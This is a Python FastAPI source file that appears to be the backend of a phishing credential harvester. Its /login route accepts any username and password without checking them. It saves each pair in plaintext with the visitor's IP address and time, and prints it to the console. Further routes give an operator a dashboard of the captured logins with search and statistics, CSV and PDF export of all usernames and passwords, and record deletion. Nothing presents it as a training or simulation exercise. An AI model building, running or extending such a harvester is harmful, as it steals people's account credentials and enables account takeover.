from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, FileResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from datetime import datetime
from sqlalchemy import insert, select, delete
from database.db import engine
from database.models import credentials
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle
from reportlab.lib import colors
import csv

app = FastAPI()

templates = Jinja2Templates(directory="web/templates")


# ---------------- HOME ----------------

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse(
        request=request,
        name="login.html"
    )


# ---------------- LOGIN ----------------

@app.post("/login")
async def login(
    request: Request,
    username: str = Form(...),
    password: str = Form(...)
):

    ip = request.client.host
    login_time = str(datetime.now())

    with engine.begin() as conn:
        conn.execute(
            insert(credentials).values(
                username=username,
                password=password,
                ip_address=ip,
                login_time=login_time
            )
        )

    print("===================================")
    print("Username :", username)
    print("Password :", password)
    print("IP       :", ip)
    print("Time     :", login_time)
    print("===================================")

    return RedirectResponse(
    url="/dashboard",
    status_code=303
)

# ---------------- DASHBOARD ----------------

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request, search: str = ""):

    with engine.connect() as conn:
        records = conn.execute(
            select(credentials)
        ).mappings().all()

    if search:
        records = [
            row for row in records
            if search.lower() in row["username"].lower()
        ]

    total_logins = len(records)
    total_ips = len(set(row["ip_address"] for row in records))
    latest_user = records[-1]["username"] if records else "No Data"

    return templates.TemplateResponse(
        request=request,
        name="dashboard.html",
        context={
            "request": request,
            "records": records,
            "search": search,
            "total_logins": total_logins,
            "total_ips": total_ips,
            "latest_user": latest_user
        }
    )
# ---------------- DOWNLOAD CSV ----------------

@app.get("/download")
async def download():

    with engine.connect() as conn:
        records = conn.execute(
            select(credentials)
        ).mappings().all()

    with open("credentials.csv", "w", newline="") as file:

        writer = csv.writer(file)

        writer.writerow([
            "ID",
            "Username",
            "Password",
            "IP Address",
            "Login Time"
        ])

        for row in records:
            writer.writerow([
                row["id"],
                row["username"],
                row["password"],
                row["ip_address"],
                row["login_time"]
            ])

    return FileResponse(
        "credentials.csv",
        filename="credentials.csv"
    )


# ---------------- DOWNLOAD PDF ----------------

@app.get("/download-pdf")
async def download_pdf():

    with engine.connect() as conn:
        records = conn.execute(
            select(credentials)
        ).mappings().all()

    pdf_file = "credentials_report.pdf"

    doc = SimpleDocTemplate(pdf_file)

    data = [
        ["ID", "Username", "Password", "IP Address", "Login Time"]
    ]

    for row in records:
        data.append([
            row["id"],
            row["username"],
            row["password"],
            row["ip_address"],
            str(row["login_time"])
        ])

    table = Table(data)

    table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.grey),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
        ("GRID", (0, 0), (-1, -1), 1, colors.black),
        ("BACKGROUND", (0, 1), (-1, -1), colors.beige),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("BOTTOMPADDING", (0, 0), (-1, 0), 10),
    ]))

    doc.build([table])

    return FileResponse(
        pdf_file,
        filename="credentials_report.pdf",
        media_type="application/pdf"
    )


# ---------------- DELETE RECORD ----------------

@app.get("/delete/{record_id}")
async def delete_record(record_id: int):

    with engine.begin() as conn:
        conn.execute(
            delete(credentials).where(
                credentials.c.id == record_id
            )
        )

    return RedirectResponse(
        url="/dashboard",
        status_code=303
    )